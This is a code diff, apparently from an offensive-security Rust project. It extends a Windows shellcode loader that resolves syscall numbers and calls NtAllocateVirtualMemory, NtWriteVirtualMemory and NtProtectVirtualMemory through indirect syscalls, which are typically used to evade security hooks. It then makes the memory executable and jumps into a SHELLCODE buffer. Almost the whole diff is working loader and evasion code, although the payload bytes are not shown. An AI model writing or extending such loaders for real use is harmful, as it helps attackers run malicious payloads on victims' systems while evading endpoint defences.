@@ -1,14 +1,9 @@
-use std::{
-    arch::global_asm,
-    ffi::CStr,
-    os::raw::c_void,
-    ptr::{null, null_mut},
-};
+use std::{arch::global_asm, ffi::CStr, os::raw::c_void, ptr::null_mut};
 
-use ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PTEB};
+use ntapi::{ntkeapi::ProfileLoadLinkedIssues, ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PTEB};
 use windows_sys::Win32::System::{
     Diagnostics::Debug::IMAGE_NT_HEADERS64,
-    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
+    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE},
     SystemServices::{
         IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
     },
@@ -186,6 +181,8 @@ fn get_ssn(func_name: &str, syscall_addr: &mut *mut c_void) -> u32 {
     return ssn;
 }
 
+type ShellcodeFn = unsafe extern "C" fn() -> ();
+
 fn main() {
     let mut syscall_addr: *mut c_void = null_mut();
     let ssn = get_ssn("NtAllocateVirtualMemory", &mut syscall_addr);
@@ -221,4 +218,72 @@ fn main() {
     }
 
     println!("[+] Allocated {} bytes at {:p}", size, base_address);
+
+    let mut bytes_written: usize = 0;
+    let ssn = get_ssn("NtWriteVirtualMemory", &mut syscall_addr);
+    println!("[+] NtWriteVirtualMemory SSN: 0x{:X}", ssn);
+    println!(
+        "[+] NtWriteVirtualMemory syscall address: {:p}",
+        syscall_addr
+    );
+    unsafe {
+        SSN = ssn;
+        Syscall_Addr = syscall_addr;
+    }
+
+    let status = unsafe {
+        Sys_NtWriteVirtualMemory(
+            -1isize as *mut c_void,
+            base_address,
+            SHELLCODE.as_ptr() as _,
+            SHELLCODE.len(),
+            &mut bytes_written,
+        )
+    };
+
+    if status != 0 {
+        println!(
+            "[-] NtWriteVirtualMemory failed with status: 0x{:X}",
+            status
+        );
+        return;
+    }
+
+    println!("[+] Wrote {} bytes at {:p}", bytes_written, base_address);
+
+    let mut old_protect: u32 = 0;
+    let ssn = get_ssn("NtProtectVirtualMemory", &mut syscall_addr);
+    println!("[+] NtProtectVirtualMemory SSN: 0x{:X}", ssn);
+    println!(
+        "[+] NtProtectVirtualMemory syscall address: {:p}",
+        syscall_addr
+    );
+    unsafe {
+        SSN = ssn;
+        Syscall_Addr = syscall_addr;
+    }
+
+    size = SHELLCODE.len();
+
+    let status = unsafe {
+        Sys_NtProtectVirtualMemory(
+            -1isize as *mut c_void,
+            &mut base_address,
+            &mut size,
+            PAGE_EXECUTE_READ,
+            &mut old_protect,
+        )
+    };
+
+    if status != 0 {
+        println!(
+            "[-] NtProtectVirtualMemory failed with status: 0x{:X}",
+            status
+        );
+        return;
+    }
+
+    let shellcode_fn: ShellcodeFn = unsafe { std::mem::transmute(base_address) };
+    println!("[+] Executing shellcode...");
+    unsafe { shellcode_fn() };
 }
